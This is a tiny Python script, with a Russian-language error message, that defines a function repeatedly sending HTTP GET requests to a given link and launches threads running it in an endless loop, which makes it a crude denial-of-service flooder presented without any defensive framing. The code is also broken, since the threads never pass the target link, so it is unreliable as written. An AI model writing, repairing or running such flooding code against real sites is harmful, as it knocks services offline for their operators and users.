try:
  import threading
  import requests
except: print("Ой! Кажется, не все библиотеки были установлены...\n")

def dos(link: str):
 while True:
  requests.get(link)
  
while True:
 threading.Thread(target=dos).start()